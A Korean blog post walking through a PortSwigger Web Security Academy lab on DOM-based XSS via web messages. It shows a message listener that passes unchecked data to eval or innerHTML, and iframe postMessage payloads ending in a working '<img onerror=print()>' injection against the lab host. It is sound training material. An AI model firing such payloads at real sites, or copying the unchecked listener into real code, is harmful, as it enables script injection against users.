---
layout: post
title: "Burp Academy-Dom 관련 취약점: DOM XSS using web messages"
categories: [보안취약점, Burp Academy]
tags: [보안취약점, Burp Academy, Dom 관련 취약점, XSS]
toc: true
last_modified_at: 2023-08-07 09:33:00 +0900
---

# 개요
- Dom based 타입의 XSS 취약점 문제이다. 
- 문제 주소: https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages
- Dom 취약점 중에서 웹메세지 설명페이지: https://portswigger.net/web-security/dom-based/controlling-the-web-message-source
- 난이도: PRACTITIONER (보통)


# 문제 
- 이 랩에서 웹 메시지 취약점이 있다. 
- 익스플로잇 서버에서 타겟서버로 웹 메세지를 보내 print함수가 실행되도록 하면 문제가 풀린다. 

```
This lab demonstrates a simple web message vulnerability. To solve this lab, use the exploit server to post a message to the target site that causes the print() function to be called.
```


# Web Message를 통한 XSS 기본 지식
어떤 웹 사이트에 다음과 같은 코드가 있다고 하자. 

```js
<script>
window.addEventListener('message', function(e) {
  eval(e.data);
});
</script>
```

위 코드는 취약하다. 왜냐하면 공격자가 다음 iframe을 victim에게 실행시키면 Javascript코드 삽입이 가능하기 때문이다. 

```html
<iframe src="//vulnerable-website" onload="this.contentWindow.postMessage('print()','*')">
```

웹 사이트의 이벤트 리스너가 메세지의 오리진을 체크하지 않고, 공격자의 postMessage() 메서드의 targetOrigin이 *를 지정하고 있으므로, 이벤트 리스너는 페이로드를 수락하고 이를 싱크(eval함수)로 전달하기 때문에 코드 인젝션이 가능해진다. 

# 풀이 
그러면 위의 지식을 가지고 문제를 풀어보자. 

## 웹 메세지 취약점이 있는 곳 찾기 
문제 서버의 / 경로의 HTML페이지를 분석해보면 다음과 같은 코드가 있다. innerHTML함수를 쓰고 있으므로 코드 인젝션이 가능해보인다. 

```js
<script>
    window.addEventListener('message', function(e) {
        document.getElementById('ads').innerHTML = e.data;
    })
</script>
```

## exploit코드 만들기 & 테스트 

심플하게 다음 코드를 전달하면 될 것 같다. 

```html
<iframe src="https://0a7800dc031aec818168d4a800e2007f.web-security-academy.net/" onload="this.contentWindow.postMessage('print()','*')">
```

그런데 테스트해보면 동작하지 않는다. 삽입이 대상이 되는 코드는 다음과 같이 생겼다. div 태그이므로 단순히 print()를 삽입해서는 안되고 브라우저가 코드가 동작시키도록 만들어야한다. 

```html
<div id="ads">
</div>
```

이건 어떨까?

```html
<iframe src="https://0a7800dc031aec818168d4a800e2007f.web-security-academy.net/" onload="this.contentWindow.postMessage('<script>print()</script>','*')">
```

동작하지 않는다. 

다음 코드로 했을 때 동작한다. innerHTML은 script태그가 아니라 HTML을 구성하는 태그를 삽입했을 때 동작하는 것으로 보인다. 

```html
<iframe src="https://0a7800dc031aec818168d4a800e2007f.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">
```

![성공](/images/burp-academy-dom-based-xss-1-success.png)